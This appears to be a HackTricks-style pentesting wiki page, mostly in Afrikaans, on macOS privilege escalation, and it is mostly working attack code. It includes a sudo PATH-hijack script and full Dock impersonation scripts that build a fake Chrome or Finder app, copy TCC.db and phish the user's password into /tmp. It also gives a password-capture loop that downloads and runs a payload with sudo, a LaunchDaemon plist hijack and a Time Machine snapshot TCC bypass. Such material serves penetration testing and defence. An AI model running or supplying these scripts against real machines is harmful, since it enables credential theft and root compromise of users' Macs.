# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

As jy hierheen gekom het op soek na TCC privilege escalation, gaan na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Neem asseblief kennis dat **die meeste truuks oor privilege escalation wat Linux/Unix raak, ook MacOS** masjiene sal beïnvloed. Sien:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Gebruikersinteraksie

### Sudo Hijacking

You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Tog **handhaaf** macOS die gebruiker se **`PATH`** wanneer hy **`sudo`** uitvoer. Dit beteken dat 'n ander manier om hierdie aanval te bereik sou wees om **hijack other binaries** wat die slagoffer sal uitvoer wanneer hy **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Let daarop dat 'n gebruiker wat die terminal gebruik waarskynlik **Homebrew geïnstalleer** het. Dit maak dit moontlik om uitvoerbare lêers in **`/opt/homebrew/bin`** te kap.

### Dock Impersonation

Deur 'n bietjie **social engineering** te gebruik, kan jy byvoorbeeld **Google Chrome** binne die Dock naboots en eintlik jou eie skrip uitvoer:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Sommige voorstelle:

- Kyk in die Dock of daar 'n Chrome is, en in daardie geval **verwyder** daardie inskrywing en **voeg** die **vals** **Chrome-inskrywing op dieselfde posisie** in die Dock-array by.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Voorstelle:

- Jy **kan nie Finder uit die Dock verwyder nie**, dus as jy dit by die Dock gaan voeg, kan jy die vals Finder net langs die regte een sit. Hiervoor moet jy **die vals Finder-inskrywing aan die begin van die Dock array voeg**.
- 'n Ander opsie is om dit nie in die Dock te plaas nie en dit net oop te maak; "Finder asking to control Finder" is nie so vreemd nie.
- Nog 'n opsie om **escalate to root without asking** die wagwoord met 'n lelike dialoog te omseil, is om Finder werklik die wagwoord te laat vra om 'n bevoorregte aksie uit te voer:
- Vra Finder om 'n nuwe **`sudo`** lêer na **`/etc/pam.d`** te kopieer (die prompt wat om die wagwoord vra sal aandui dat "Finder wants to copy sudo")
- Vra Finder om 'n nuwe **Authorization Plugin** te kopieer (Jy kan die lêernaam beheer sodat die prompt wat om die wagwoord vra aandui dat "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Wagwoordprompt phishing + sudo reuse

Malware misbruik dikwels gebruikersinteraksie om **ʼn sudo-geskikte wagwoord vas te vang** en dit programmaties weer te gebruik. ʼn Algemene vloei:

1. Identifiseer die aangemelde gebruiker met `whoami`.
2. **Herhaal wagwoordversoeke** totdat `dscl . -authonly "$user" "$pw"` suksesvol terugkeer.
3. Kas die inlogbewyse (bv., `/tmp/.pass`) en voer geprivilegieerde aksies uit met `sudo -S` (wagwoord oor stdin).

Voorbeeld minimale ketting:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Die gesteelde wagwoord kan dan hergebruik word om **Gatekeeper-quarantaine skoon te maak met `xattr -c`**, LaunchDaemons of ander geprivilegieerde lêers te kopieer, en verdere fases nie-interaktief uit te voer.

## Nuwer macOS-spesifieke vektore (2023–2025)

### Verouderde `AuthorizationExecuteWithPrivileges` nog steeds bruikbaar

`AuthorizationExecuteWithPrivileges` was deprecated in 10.7 but **still works on Sonoma/Sequoia**. Baie kommersiële updaters roep `/usr/libexec/security_authtrampoline` aan met 'n onbetroubare pad. As die teiken-binarie deur die gebruiker skryfbaar is, kan jy 'n trojan plant en die legitieme prompt misbruik:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombineer dit met die **masquerading tricks above** om 'n geloofwaardige wagwoord-dialoog te wys.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

As 'n LaunchDaemon plist of sy `ProgramArguments`-teiken **user-writable** is, kan jy escalate deur dit te verwissel en dan launchd te dwing om te herlaai:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Dit weerspieël die exploit-patroon wat gepubliseer is vir **CVE-2025-24085**, waar 'n writable plist misbruik is om aanvallerkode as root uit te voer.

### XNU SMR credential race (CVE-2025-24118)

'n **race in `kauth_cred_proc_update`** laat 'n plaaslike aanvaller toe om die lees-slegs credential-aanwyser (`proc_ro.p_ucred`) te korrupteer deur `setgid()`/`getgid()`-lusse oor drade te wedloop totdat 'n geskeurde `memcpy` voorkom. Suksesvolle korrupsie gee **uid 0** en toegang tot kernel-geheue. Minimale PoC-struktuur:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Kombineer dit met heap grooming om beheerde data te plaas waar die pointer weer gelees word. Op kwesbare builds is dit 'n betroubare **local kernel privesc** sonder SIP-bypass vereistes.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

As jy reeds root het, blokkeer SIP steeds skryfaksies na stelsel-ligginge. Die **Migraine** bug misbruik die Migration Assistant entitlement `com.apple.rootless.install.heritable` om 'n child process te spawn wat SIP-bypass erflik erf en beskermde paaie (bv. `/System/Library/LaunchDaemons`) oorskryf. Die ketting:

1. Kry root op 'n lewendige stelsel.
2. Trigger `systemmigrationd` met 'n gemanipuleerde staat om 'n deur die aanvaller beheerde binary uit te voer.
3. Gebruik die geërfde entitlement om SIP-beskermde lêers te patch, wat selfs ná 'n herbegin voortbestaan.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Meerdere Apple daemons aanvaar **NSPredicate** objects oor XPC en valideer slegs die `expressionType`-veld, wat deur die aanvaller beheer word. Deur 'n predicate te konstrueer wat arbitrêre selectors evalueer, kan jy **code execution in root/system XPC services** bereik (bv. `coreduetd`, `contextstored`). Wanneer dit gekombineer word met 'n aanvanklike app sandbox escape, verleen dit **privilege escalation without user prompts**. Soek XPC-endpunte wat predicates deserialiseer en 'n robuuste visitor ontbreek.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Enige gebruiker** (selfs onprivilegieerde gebruikers) kan 'n Time Machine snapshot skep en mount en **TOEGANG kry TOT AL die lêers** van daardie snapshot.  
Die **enigste voorwaarde** is dat die toepassing wat gebruik word (soos `Terminal`) **Full Disk Access** (FDA) toegang (`kTCCServiceSystemPolicyAllfiles`) het, wat deur 'n admin verleen moet word.

<details>
<summary>Koppel Time Machine-snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

'n Meer gedetailleerde verduideliking kan gevind word in die [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Sensitiewe Inligting

Dit kan nuttig wees om bevoegdhede te verhoog:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Verwysings

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
